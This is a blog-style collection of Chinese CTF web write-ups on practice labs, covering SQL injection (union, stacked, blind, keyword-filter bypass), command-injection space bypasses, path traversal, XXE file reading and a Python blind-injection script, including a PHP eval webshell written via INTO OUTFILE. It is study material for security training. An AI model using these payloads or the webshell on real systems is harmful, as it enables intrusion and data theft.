---
title: web-未整理解题过程
date: 2026-01-21 19:39:43
tags: [web-未整理]
categories:
  - ctf题解
  - web
---

## web-未整理解题过程

## sql注入

1.账号密码登陆题目

方法一：万能账户密码
判断闭合方式后就可以套公式啦

sql语句：[]()
1.原本：随便输入

```
SELECT*FROM table_name WHERE username=' a' and password='123';
```



2.我们要做的：

```
SELECT*FROM table_name WHERE username='      a' or ture #     ' and password='123';
```



当输入   a' or ture #   
整句话会被解析成：    

```
 xx一堆被闭合的垃圾话xx       or ture 
```

（一个成立即为真）

where条件为真，执行最前面select语句

那么就通关了

这里有一个问题：为什么账号和密码只要一个填了万能公式就可以成功？
你先想一下：账号填了这个万能公式，密码填的明明是错的为什么可以对？

```
SELECT*FROM table_name WHERE username='      a'        or ture          #     ' and password='123';
```


即使密码是错的，但是被注释掉了
只要整个语句的值是真的就欧克

所以当我们密码用万能时，语句变成：

```
SELECT*FROM table_name WHERE username=' a' and password=' a'     or true    	  #';
```

你说你输什么用户能让这句话错吗？nonononono











## [极客大挑战 2019]Secret File

### 1

这道题设计代审，我们会到某一个步骤发现php代码，然后按照提示我们需要用伪协议读取flag.php，

但是，千万注意：

因为关键的代码

这些都是漏洞，而想要利用这些漏洞构造payload必须要在这个网页上面

因此我们需要在此网页后直接跟payload：

?file=php://filter/read=convert.base64-encode/resource=你想要看的文件

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

<!DOCTYPE html>
<html>


这里得到的码在经过转码就能看到:

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>
    
    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{76a1cef7-2036-42cf-ab49-d9fc9bcba947}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>





## [强网杯 2019]随便注

### 1

随便注，那就sql注入

输入万能

发现字符型注入



发现数组，没啥用

```
array(2) {
  [0]=>
  string(1) "1"
  [1]=>
  string(7) "hahahah"
}
array(2) {
  [0]=>
  string(1) "2"
  [1]=>
  string(12) "miaomiaomiao"
}
array(2) {
  [0]=>
  string(6) "114514"
  [1]=>
  string(2) "ys"
}
```

### 



1. order by，没结果。果断使用堆叠注入

2. selcet发现被过滤

3. ```
   1';show databases;#
   ```

```
array(1) {
  [0]=>
  string(11) "ctftraining"
}
array(1) {
  [0]=>
  string(18) "information_schema"
}
array(1) {
  [0]=>
  string(5) "mysql"
}
array(1) {
  [0]=>
  string(18) "performance_schema"
}
array(1) {
  [0]=>
  string(9) "supersqli"
}
array(1) {
  [0]=>
  string(4) "test"
}
```



4. 1';show tables;#

   ```
   array(1) {
     [0]=>
     string(16) "1919810931114514"
   }
   array(1) {
     [0]=>
     string(5) "words"
   }
   ```

   

5. ```
   1'; show columns from `1919810931114514`;#
   ```



```
array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```



6.1 

预编译：

```
1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE  hacker;#
```

6.2

handle

HANDLER 功能类似`SELECT * FROM 表名`，在不能用select的时候使用

```
1';HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;#

1';
HANDLER `1919810931114514` OPEN;
HANDLER `1919810931114514` READ FIRST;
HANDLER `1919810931114514` CLOSE;#

```

```sql
HANDLER `1919810931114514` OPEN;          -- 打开数据表
HANDLER `1919810931114514` READ FIRST;     -- 读取表的第一行数据
HANDLER `1919810931114514` CLOSE;          -- 关闭数据表
```





























































## Pikachu靶场-SQL注入-数字型注入（post）题解

```
`select * from 表 where 字段=输入内容`（无引号，直接接数字）
```



1.抓包，发现有id=3&submit=%E6%9F%A5%E8%AF%A2，这个就是注入点

2.输入id=3 and 1=1 --&submit=%E6%9F%A5%E8%AF%A2 没报错

  输入id=3 and 1=2 --&submit=%E6%9F%A5%E8%AF%A2 报错

由此，我们知道报错页面和没报错页面长啥样

3.寻找有多少个字段显示（1-3都输入后，发现3报错）

  输入id=3 order by 1 --&submit=%E6%9F%A5%E8%AF%A2

因此只有两个字段

4.select显示

  输入id=3 union select 11，22 --

  输出：

hello,kobe <br />your email is: kobe@pikachu.com</p><p class='notice'>hello,11 <br />your email is: 22



5.找数据库名

```javascript
union select version() ,database() --
```

数据库名：pikachu

6.找表名

```
union select table_name,22 from information_schema.tables where table_schema=database() -- 
```

表名：users

7.找列名

```
union select column_name,22 from information_schema.columns where table_schema='pikachu' and table_name='users' -- bbq
```

列名：user，password

8.找数据

```javascript
union select username,password from users -- bbq
```







## Pikachu靶场-SQL注入-字符型注入（get）题解

```
select * from 表 where 字段='输入内容'
```

1.输入万能密码

得到：

your uid:1 
your email is: vince@pikachu.com

your uid:2 
your email is: allen@pikachu.com

your uid:3 
your email is: kobe@pikachu.com

your uid:4 
your email is: grady@pikachu.com

your uid:5 
your email is: kevin@pikachu.com

your uid:6 
your email is: lucy@pikachu.com

your uid:7 
your email is: lili@pikachu.com

所以，我们能找到账号和密码，并且让它展示出来像这样就好了

your uid:账号 
your email is: 密码

2.寻找账号密码，就需要知道他们在哪儿

查数据库：pikachu

查表：有个users表

查列名：找到passwd和username两个列名

显示账号密码：select password，username from users #

3.得到答案



## Pikachu靶场-SQL注入-搜索型注入 题解

```
select * from 表 where 字段 like '%输入内容%'
```

找字段：

a%' order by 2 #



## Pikachu靶场-SQL注入-xx型注入 题解

```
select * from 表 where 字段 like ('输入内容')
```

找字段：

a') order by 2 #









`outfile`

1.SELECT ... INTO OUTFILE '文件路径'  //可以把搜索到的数据导出到文本文件上

2.secure_file_priv 的三种结果含义是：
 NULL 表示不能导出文件
 空值表示可以导出到任意路径
 指定路径表示只能导出到该路径

3.@@secure_file_priv 用来判断你能不能写文件、能不能写 shell
4.@@datadir 用来查看数据库真实存放在哪个磁盘目录





## sqli-7 题解

1.经过一系列探索注入尝试发现输入结构:（（''）），且字段数为3

```
/?id=1')) union select 1,2,3--+
```

返回：

```
You are in.... Use outfile......
```

这道题目没有回显，不能用联合注入





2.决定使用outfile进行木马注入

观察源代码

发现：输出错误信息这一行被注释掉了，所以不能用报错注入

```
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>


";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());     //输出错误信息这一行被注释掉了，所以不能用报错注入
	echo "</font>";
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
```

于是想起题目提示：use outfile

注意：使用这个功能需要提前开启权限。你可以前往MySQL的源文件目录中，
	打开my.ini配置文件，并修改其中的`secure_file_priv='D://'`
	参数设置为你的安全目录。(请设置为C盘以外的磁盘，避免系统权限问题。)
	修改完成并重启后在MySQL命令行中输入`show variables like '%secure%';`查看是否设置成功。

但是有使用条件：

​	1.你有没有权限

​	2.你知道你写入的文件在哪里（网站在服务器上的绝对路径）

​	找法：Web 路径只能通过：读源码、猜默认目录、或从数据库配置反推。

​	用靶场第二关来获得绝对路径。@@basedir()是安装MYSQL的安装路径 ，@@datadir()是安装MYSQL的数据文件路径

```
?id=-1 union select 1,@@basedir,@@datadir
    basedir()指定了安装MYSQL的安装路径
    datadir()指定了安装MYSQL的数据文件路径
```

使用木马：

select 内容 into outfile

```
?id=-1')) union select 1,2,'<?php eval(@$_POST["cmd'"]);?>' into outfile"F:\\phpstudy_pro\\WWW\\sqli-labs\\less-7\\hack.php"--+
```



3.连接yijian，获得wedshell权限



## sqli-8 题解（布尔盲注）

###### 方法一：手搓

1.前期准备：

判断注入类型，字段个数（没有显示位，字符型注入）

2.布尔盲注

python sqlmap.py -u "http://286a3ec8-212c-4ea7-bb63-f896372bbe7e.node5.buuoj.cn/Less-8/?id=1'" -D security -T users -C username,password --dump --batch

步骤1：判断数据库长度

```
?id=1' and length(database())>1--+   //正常
?id=1' and length(database())>10--+  //报错
?id=1' and length(database())>5--+   //正常
?id=1' and length(database())>8--+   //报错
?id=1' and length(database())>7--+   //正常
```

```matlab
?id=1' and length(database())=8 --+
```

步骤2：数据库名

```
?id=1' and ascii(substr((database()),1,1)) >100 --+   //正常
?id=1' and ascii(substr((database()),1,1)) >110 --+   //正常
?id=1' and ascii(substr((database()),1,1)) >114 --+   //正常
?id=1' and ascii(substr((database()),1,1)) >115 --+   //报错
```

```cobol
?id=1' and ascii(substr((database()),1,1)) =115 --+
```

115对应的的是s，继续猜测剩下的字母

得database='security'

步骤3：判断表的数量

```csharp
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=3--+
```

步骤4：表名

判断表长度

```csharp
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6--+
```

。。。。。。。太多了，不如用sqlmap

但要大致学会原理：

#### 一、布尔盲注

布尔盲注是一种基于布尔逻辑的盲注方法。

在sqli-labs的第八关中，我们可以尝试使用布尔盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：

```
' AND (SELECT * FROM users WHERE username='admin')=1 --
```

如果上述查询语句返回结果集，说明“admin”这个用户名存在于用户表中。接着，我们可以尝试构造一个包含密码猜测的查询语句，例如：

```
' AND (SELECT * FROM users WHERE username='admin' AND password='password')=1 --
```

如果返回结果集，说明我们猜测的密码可能是正确的。通过不断尝试不同的密码，最终可以获取到管理员的密码。

#### 二、时间盲注

时间盲注是一种基于时间差的盲注方法。

在sqli-labs的第九关中，我们可以尝试使用时间盲注来获取管理员的密码。首先，我们需要找到注入点，然后构造一个类似于以下的查询语句：

```
' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
```

上述查询语句会判断密码的第一位是否为字母“a”，如果是，则执行一个延时5秒的函数（SLEEP）。通过观察返回结果集的时间差，如果延时超过5秒，说明密码的第一位可能是字母“a”。接着，我们可以尝试其他字符，并观察时间差的变化，最终可以获取到管理员的密码。

很多时候不推荐使用



方法二：sqlmap

方法三：抓包

数据库常用

```plaintext
id=1' and substr(database(),{{int(1-32)}},1)='{{list(a|b|c|0|1|_)}}' --+
```

## [GXYCTF2019]Ping Ping Ping 1 题解

/?ip= 
提示我们输入关于ip的命令，明显就是ping喽
url后加127.0.0.1，ping通了

然后ls，会发现直接显示出了flag.php
尝试cat查看，发现显示
/?ip= fxck your space!
啥玩意，明显不让我们看，为什么呢？因为space空格，那我们替换空格。用可以填写能够代替空的某些专业术语就行

1、命令绕过空格方法有：

```
${IFS}$9
{IFS}
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
IFS
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
```



2.有时会禁用cat:
解决方法是使用tac反向输出命令：

这个真的很有趣，比如内容是1，2，3
tac输出的是3，2，1
我觉得好可爱

切入正题：

输入

```
/?ip=127.0.0.1;cat$IFS$1flag.php
```



得到：
/?ip= fxck your flag!
诶哟，怎么flag也不行
那就制造一个不一样的flag
需要用到变量，比如

```
;a=g;fla$a
```


试试看：

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```


得到flag





## 攻防世界 robots 题解

抓包得到

```
<h1></h1>
<!--flag is not here-->


</body>
</html>
```

1. url跟上/robots.txt

   返回：

   User-agent: *
   Disallow: 
   Disallow: f1ag_1s_h3re.php

2. url跟上/f1ag_1s_h3re.php





## [SUCTF 2019]EasySQL

### 1题解



#### 知识点

#### 1.**PIPES_AS_CONCAT：将 || 或运算符 转换为 连接字符，即将||前后拼接到一起。**

把||变成字符串连接符，而不是或

涉及到mysql中sql_mode参数设置，设置 sql_mode=pipes_as_concat字符就可以设置。

即set sql_mode=ppipes_as_concat

#### 2. select语法

##### 2.1搜索用法（查数据库里的数据）—— 不存在会报错

如果 `select` 后面跟的是 **数据库中的表、字段**，那确实是 “搜索”，找不到就会报错：

##### 2.2 输出用法（打印常量 / 表达式）—— 永远不报错，和数据库数据无关

如果 `select` 后面跟的是 **常量（1、'abc'）、数学表达式（1+2）**，那它就像 “echo”，直接输出结果，根本不依赖数据库里的任何数据：

- 例子 1：`select 1;` → 输出 1（和数据库里有没有表、有没有数据无关）；

- 例子 2：`select 1+2*3;` → 输出 7（SQL 直接计算表达式，不用查数据库）；

- ###### 例子 3：`select 'hello';` → 输出 hello（字符串常量，天生存在）。

  



进入后显示：
Give me your flag, I will tell you if the flag is right.

1.输入以下语句：

```
1;desc `FLAG_TABLE`
得：Nonono.

1;show column from `FLAG_TABLE`
得：Nonono.

1; show databases;
得：Nonono.
```

观察一下这些语句：

1;一堆语句               

疑问：为什么要加1



因为我们猜测后端语句：

```sql
select $_POST['query'] || flag from Flag;
```



后端：

select $_POST['query'] || flag from Flag;

如果直接输入：show databases;

```
select show databases|| flag from Flag;
```

不符合语法，你都没有用到select语句，就直接跟show了

```sql
select 1; show databases|| flag from Flag;
```

这样输入之后语法正确



2.1继续输入

```
1;show columns from Flag;#
```

Nonono.

#### 思路一：输入payload（精心设计的恶意语句），然后把||看成拼接

```
select 1 || flag from Flag
```

这句话是：先搜索1，然后再搜索flag，再把俩值拼接起来



输入：

```sql
select 1; sql_mode=PIPES_AS_CONCAT; || flag from Flag;
```

`||` 前面没有任何操作，会导致语法错误！

所以末尾再加上select 1;

而且别忘记加上后末尾不要跟；  否则也会导致||前面没有任何操作

变成：

```cobol
1;sql_mode=PIPES_AS_CONCAT;select 1  //不行，改变参数要用set
1;set sql_mode=PIPES_AS_CONCAT;select 1  //成功
```



## moectf 2025 05 第五章 打上门来！

题目关键词：穿梭在文件目录

即 在文件目录中寻找flag

```
./ 当前目录
../上一级目录
```

在当前目录发现给我们的所有内容中并没有flag，说明：在这些文件目录的下一级

于是我们输入

```
../flag
```

错了

寻找是否在 下一级目录的下一级中

```
../../falg
```

以此类推

直到

```
../../../../../../../flag
```

得到flag







典型的 XXE 注入漏洞 题目



知识点准备：

1. XXE：XML 外部实体注入（当成sql注入看就行）

2. XML：<标签> 格式

3. file:///var/www/html/.............

   linux结构

   

通用格式

```xml
<!DOCTYPE 任意名字 [
<!ENTITY 实体名 SYSTEM "file:///文件绝对路径">
]>
<网站接收的标签名>&实体名;</网站接收的标签名>

```





第一步：

一进去发现有个大方框让你提交东西，随便写一个啥提交，得到：

```
<br />
<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity, line: 1 in <b>/var/www/html/chapter10.php</b> on line <b>17</b><br />


<阵枢>引魂玉</阵枢>
<解析>未定义</解析>
<输出>未定义</输出>
```

分析：

1.<b>Warning</b>:  DOMDocument::loadXML(): Start tag expected, '&lt;' not found in Entity

说明：第一，我们没有按照他所希望的格式注入：'&lt;'（也就是'&lt'）



2.<输出>未定义</输出>

说明：第二，很明显了，格式是xml

第二，我们需要在这里获取flag内容

所以，这个会被后面用到

```
<网站要求的标签>&x;</网站要求的标签>
```



3./var/www/html/chapter10.php

很明显，linux文件夹结构，也许flag就在这里面

可以改成：/var/www/html/flag.txt



第二步：

输入对应格式的注入，拿到flag

固定格式：

```xml
<!DOCTYPE 任意名字 [<!ENTITY 实体名 SYSTEM "file:///文件绝对路径">]>
<网站接收的标签名>&实体名;</网站接收的标签名>

```



```
<!DOCTYPE A [
<!ENTITY x SYSTEM "file:///要读的文件路径">
]>
<网站要求的标签>&x;</网站要求的标签>
```




```xml
<?xml version="1.0" encoding="utf-8"?>  //可以不写


<!DOCTYPE 输出 [
<!ENTITY flag SYSTEM "file:///var/www/html/doLogin.php">]>
<输出>&flag;</输出> 
```

用`&实体名;`的格式引用刚才定义的`flag`实体；



<!DOCTYPE 输出 [
<!ENTITY flag SYSTEM "file:///var/www/html/flag.txt">]>
<输出>&flag;</输出>






## MoeCTF 2025 12 第十二章 玉魄玄关·破妄



1.一进入，看到了一句话木马

然后题解写着：一句话木马和flag在环境变量中

```
<?php
highlight_file(__FILE__);
@eval($_POST['cmd']);
```

2.直接蚁剑连接，连接虚拟终端

![](/images/屏幕截图 2025-11-17 223714.png)

发现啊linux系统，我们要在里面找flag

直接输入：env |grep -i flag

-i选项：不分大小写grep过滤





## [极客大挑战 2019]LoveSQL

### 1题解

1.进去使用万能密码，登陆成功，**发现一段乱码提交发现错误，这并不是flag**

原url：/check.php?username=1'+or+1%3D1%23&password=55

2.输入1-4，4处报错，说明没有第四个字段

（在输入1-3时他说你密码错误不要慌，你只是在找字段，只要他能正常显示说明此字段存在）

```
/check.php?username=1' order by 4%23&password=ads
```

3.寻找注入点

```
?username=1' union select 1,2,3%23&password=ads
```

​						 					

返回2，3；

说明这两处为注入点

4.寻找数据库

```
?username=1' union select 1,database(),3%23&password=ads
```

 其中，3%23&password=ads

​	3是占位用的，没啥意义

​	%23是# ；

 其次,为什么#后面还要输出，不是都注释掉了吗？

​	因为**`#` 是 SQL 里的注释符，但它管不到 URL 的参数格式 —— 网站要求必须传 `password` 参数，所以得用 `&password=ads` 补全格式，否则网站可能直接拒绝请求**	



​	返回：Hello geek！

​	得到数据库：geek

5.寻找表名

```
?username=1' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=ads
```

- **`group_concat`**：“分组拼接”，MySQL 的聚合函数，把多行结果拼接成一个字符串（用逗号分隔）

- `group_concat(table_name)`：把所有表名拼接成一个字符串返回（方便查看）；

- table_schema：表所属数据库名

- `table_schema=database()`：限定只查当前连接的数据库的表。

  



​	返回：Your password is 'geekuser,l0ve1ysq1'

​	说明表名：geekuser,l0ve1ysq1

6. 寻找l0ve1ysq1的字段名

```
?username=1' union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&password=ads
```

​	返回：Your password is 'id,username,password'

​	说明字段名：id,username,password

7.寻找l0ve1ysq1表的id,username,password三个字段

```
?username=1' union select 1,database(),group_concat(id,username,password) from l0ve1ysq1%23&password=ads
```

​	得到：Your password is  '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{7a23d0ab-def9-4f32-bd55-8e4155655f17}'

​	说明：flag{7a23d0ab-def9-4f32-bd55-8e4155655f17}











## **[RoarCTF 2019]Easy Java1**题解

1.又是账号密码登陆，没有头绪，用sql失败，看到下面help

java.io.FileNotFoundException:{help.docx}；

说明是个可下载文件，但当前get不行，用post试试

2.下载文件，发现无可用信息

3.看到 filename=参数 ，用之前说的穿越目录，发现不可以

4.看到页面有tomcat，说明服务器了

试试：filename=WEB-INF/web.xml



为什么？

`WEB-INF/web.xml` 

1. 科普：

   WEB-INF/ 

   目录是每个 Web 应用中必须存在的目录，包含一些配置信息，不会被直接暴露给客户端访问。

   

   ```x86asm
    WEB-INF主要包含以下文件或目录：
    
   /WEB-INF/web.xml：
   是 Tomcat 网站的「核心说明书」，藏着找 Flag 的关键线索，CTF 里碰到 Tomcat 任意文件下载漏洞，必查它！
   
   
   /WEB-INF/classes/：
   含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
   
   /WEB-INF/lib/：
   用于存放 Web 应用所依赖的 JAR 包。
   
   /WEB-INF/src/：
   源码目录，按照包名结构放置各个java文件。
   
   /WEB-INF/database.properties：
   数据库配置文件
   ```

   

   

   

   

得到：

```xml
<welcome-file-list>
        <welcome-file>Index</welcome-file>
    </welcome-file-list>

    <servlet>
        <servlet-name>IndexController</servlet-name>
        <servlet-class>com.wm.ctf.IndexController</servlet-class>
        。。。。。
 <servlet-mapping>
        <servlet-name>FlagController</servlet-name>
        <url-pattern>/Flag</url-pattern>
    </servlet-mapping>        
```

推出：

```
/Flag`对应的路径为`/WEB-INF/classes/com/wm/ctf/FlagController.class
```

4.filename=WEB-INF/classes/com/wm/ctf/FlagController.class文件，发现flag，解码

（末尾 = = 知道是base64）





#### 正则表达式

| 咒语（符号）           | 作用                                                  | 举例                                                         |
| ---------------------- | ----------------------------------------------------- | ------------------------------------------------------------ |
| `.`（点）              | 匹配 “任意一个字符”（比如汉字、数字、字母，除了换行） | 咒语 “a.c” 能找到 “abc”“a1c”“a 好 c”（中间随便啥都行）       |
| `^`（尖尖）            | 匹配 “字符串开头”                                     | 咒语 “^flag” 能找到 “flag123”“flag {abc}”（必须以 flag 开头），找不到 “123flag” |
| `$`（美元符）          | 匹配 “字符串结尾”                                     | 咒语 “}”$ 能找到 “abc}”“flag {123}”（必须以} 结尾），找不到 “} 123” |
| `*`（星号）            | 前面的字符 “可以有 0 个或多个”                        | 咒语 “a*b” 能找到 “b”（a 有 0 个）、“ab”（a 有 1 个）、“aaab”（a 有 3 个） |
| `+`（加号）            | 前面的字符 “必须有 1 个或多个”                        | 咒语 “a+b” 能找到 “ab”“aaab”（a 至少 1 个），找不到 “b”（a 有 0 个） |
| `[]`（方括号）         | 匹配 “方括号里的任意一个”                             | 咒语 “[123]” 能找到 “1”“2”“3”；咒语 “[a-z]” 能找到所有小写字母（a 到 z） |
| `[^]`（方括号 + 尖尖） | 匹配 “不在方括号里的任意一个”                         | 咒语 `“[^0-9]” `能找到所有不是数字的字符（比如字母、符号）   |
| `\d`（d 小写）         | 专门匹配 “数字”（0-9）                                | 咒语 “\d\d” 能找到 “12”“34”（两个数字），相当于 “[0-9][0-9]” |
| `\w`（w 小写）         | 专门匹配 “字母、数字、下划线”                         | 咒语 “\w” 能找到 “a”“5”“_”，找不到 “！”“@”                   |

#### 1. 找 flag（最常用！）

- 正则咒语：`flag\{.*?\}`（念法：flag 左大括号，任意字符少少的，右大括号）；

- 原理：

  - `flag\{`：先找到 “flag {”（大括号要加 \，因为大括号是特殊咒语，得 “转义” 一下，告诉正则 “我就是要找大括号”）；

  - `.*?`：`.*` 会尽可能多地吃字符,？）；

    ​      `？`意味吃到第一个就停

  - `\}`：最后找到 “}”；

#### 2. 绕限制（Web 题常用）

- 场景：网站不让输入 “union select”（比如 SQL 注入时），输入就被拦截（网站用正则检测这个关键词）；

- 正则咒语（网站的拦截规则）：`^.*union.*select.*$`（意思：只要包含 “union” 和 “select” 就拦截）；

  ​		       `^  .*  union  .*  select  .*  $`

- 绕过方法（改你的输入，让网站的正则认不出来）：

  - 大小写混淆：输入 “Union Select”（网站的正则只认小写，这样就绕过去了）；

  - 插无关字符：输入 “uni/**/on sel/**/ect”

    ​		/**/：注释	

- 效果：成功输入你要的内容，实现 SQL 注入，拿到 flag！

#### 3. 筛密码（密码破解题）

- 场景：题目说 “密码是 8 位以上，有大写、小写、数字、感叹号”，给你一个密码字典（一堆可能的密码），要快速找出符合条件的；
- 正则咒语：`^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*!)(.{8,})$`；
- 原理（简单说）：
  - `(?=.*[a-z])`：必须有小写字母；   ?=是`必须要有`的意思
  - `(?=.*[A-Z])`：必须有大写字母；
  - `(?=.*\d)`：必须有数字；
  - `(?=.*!)`：必须有感叹号；
  - `(.{8,})`：总长度至少 8 位；    .是任意字符
- 效果：从 1000 个密码里，秒筛出符合条件的 10 个，再逐个尝试破解！



1. 练习 2：找数字

    

   右边文本：

   ```
   我的QQ是123456，电话是789-0123
   ```

   

   左边咒语：

   ```
   \d{6}
   ```

   （找 6 个连续数字）

   - `d{6}` → 匹配 “dddddd”；
   - `\d{6}` → 匹配 “123456”。

   

   效果：高亮 “123456”！

   

1.限定符

```
a* a出现0或多次
a+ a出现1或多次
a? a出现1或0次
a{6} a出现6次
a{2,6} a出现2-6次
a{2,} a出现2次以上
```

2.运算符

```
（a|b） 匹配a或者b
(ab)|(cd) 匹配ab
```





1.zsteg out.png 显示每个通道的隐写信息

针对png

2.exiftool out.png

png jpg

查看图片原数据/文件分析，找到提示

comment

3.binwalk 

分析文件，分区块，找到结构

4.strings

显示图片可打印字符





## [GXYCTF2019]BabySQli

### 1题解



1.万能密码（输入1'后有引号被包括在‘’内的报错，说明为字符型；输入1无报错）

发现do not hack me!，说明有过滤

但是得到了：

<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<**title**>Do you know who am I?</**title**>

base32：MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5

解码后的base64，在解码得：



```
select * from user where username='$name'
```



2.判断注入点

**name**=**1'** **union** **select** **1,2**#&pw=admin

试试：order by 1

​		2

​		3

​		4出现Error: The used SELECT statements have a different number of columns

说明3个注入点



4.查看代码找找灵感

search.php源码（`search.php`是 “用户输入 + SQL 执行” 的直接载体）

```
if(preg_match("/\(|\)|\=|or/", $name)){       //过滤
	die("do not hack me!");
}
else{
	if (!$result) {
		printf("Error: %s\n", mysqli_error($con));
		exit();
	}
	else{
		// echo '<pre>';
		$arr = mysqli_fetch_row($result);       //$arr将经过sql查询存储在$result转换成数组的形式
		// print_r($arr);
		if($arr[1] == "admin"){           //admin
			if(c($password) == $arr[2]){      
				echo $flag;
			}
```

由上：

1.存在admin

输入：

**name**=**1'** **union** **select** **1,2,'admin'**#&pw=admin    **wrong user!

**name**=**1'** **union** **select** **1,'admin',3**#&pw=admin    wrong pass!

说明：

字段2、3分别对应name、password



5.构造payload

search.php源码

```php
if($arr[1] == "admin"){
			if(md5($password) == $arr[2]){  //md5加密
				echo $flag;
			}
			else{
				die("wrong pass!");
			}
		}
```

```php
name=1' union select 1,'admin','MD5加密后的密码'#&pw=对应密码
```

123456加密后：c4ca4238a0b923820dcc509a6f75849b（我试过大写错了）

所以：name=1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1





## [极客大挑战 2019]BabySQL

### 1

select，from，imf被过滤，要双写

| 原始关键词  | 标准双写写法  | 拆分逻辑（帮理解）                                           |
| ----------- | ------------- | ------------------------------------------------------------ |
| union       | ununionion    | un + union + ion                                             |
| select      | selselectect  | sel + select + ect                                           |
| from        | frfromom      | fr + from + om                                               |
| where       | whwhereere    | wh + where + ere                                             |
| information | infoorrmation | info + or + rmation（注：information 是特殊款，核心是双写中间的 or，而非完整词） |
| schema      | schschemaema  | sch + schema + ema                                           |







1.

```
?username=1' and ununionion selselectect 1,2--+&password=1
```

```
The used SELECT statements have a different number of columns
```

2.

```
?username=1' ununionion selselectect 1,2,3--+&password=1
```

```
Hello 2！

Your password is '3' //说明回显位为2和3
```

3.

```
group_concat(table_name) from information_schema.tables where table_schema=database()
```



```
?username=1' ununionion selselectect 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+&password=1
```

```
You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right syntax to use near '.tables table_schema=database()-- ' and password='1'' at line 1
```



4.

```
?username=1' ununionion selselectect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata --+&password=1
```

```
Hello 2！
Your password is 'information_schema,performance_schema,test,mysql,ctf,geek'
```

5.

```
?username=1' ununionion selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'--+&password=1
```

```
Hello 2！
Your password is 'Flag'
```



6.

```
?username=1' ununionion selselectect 1,2,group_concat(flag) frfromom ctf.Flag--+&password=1
```









## [CISCN2019 华北赛区 Day2 Web1]Hack World 1

## 

提示：All You Want Is In Table 'flag' and the column is 'flag'  

Now, just give the id of passage

输入1：

Hello, glzjin wants a girlfriend.

1.sql发现被过滤

2.fezz得到基本上只要是关键字都被过滤了，改用 盲注脚本



```
import requests
import string

def blind_injection(url):
    flag = ''
    strings = string.printable
    for num in range(1,60):
        for i in strings:
            payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
            post_data = {"id":payload}
            res = requests.post(url=url,data=post_data)
            if 'Hello' in res.text:
                flag += i
                print(flag)
                break
    print(flag)

if __name__ == '__main__':
    url = 'http://bba3f6f0-b4cd-4c59-941b-9d84c8300332.node5.buuoj.cn:81/index.php'
    blind_injection(url)


```



```python
# 2. 定义盲注核心函数，参数url是靶场地址
def blind_injection(url):
    flag = ''  # 初始化空字符串，存储最终爆破出的flag
    
    # string.printable：包含所有可打印ASCII字符（数字、字母、符号、空格等，共100+个）
    strings = string.printable  
    
    # 遍历flag的每一位（假设最长60位，num=1代表第1位，num=2代表第2位...）
    for num in range(1,60):  
        # 遍历所有可打印字符，逐个试当前位是不是这个字符
        for i in strings:  
            # 核心注入payload，用format填充num（第几位）和ord(i)（字符i的ASCII码）
            payload = '(select(ascii(mid(flag,{0},1))={1})from(flag))'.format(num,ord(i))
            #ord(i) 把这个字符转成对应的 ASCII 码（比如 'f' → 102）；
            #mid(要截取的字符串, 从第几位开始, 截取几个字符)
            
